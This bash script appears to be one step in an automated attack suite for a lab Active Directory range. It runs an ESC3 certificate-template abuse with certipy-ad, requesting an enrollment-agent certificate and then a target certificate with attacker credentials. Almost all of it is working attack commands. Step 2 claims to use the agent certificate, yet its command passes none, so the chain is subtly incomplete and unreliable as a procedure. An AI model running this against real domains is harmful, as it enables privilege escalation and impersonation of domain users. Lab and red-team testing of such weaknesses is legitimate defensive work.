#!/bin/bash
# CONFIGURED—CA cadre-CA running, ESC3-Agent + ESC3-Target published
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "052" "ESC3 — Enrollment Agent + Target certificate chain"

require_tool certipy-ad

log "Step 1: Request enrollment agent certificate"
run_cmd "certipy-ad req -ca $CA_NAME -template CADRE-ESC3-Agent -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC3 — enrollment agent cert"

log "Step 2: Request target certificate using agent cert"
run_cmd "certipy-ad req -ca $CA_NAME -template CADRE-ESC3-Target -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC3 — target cert"
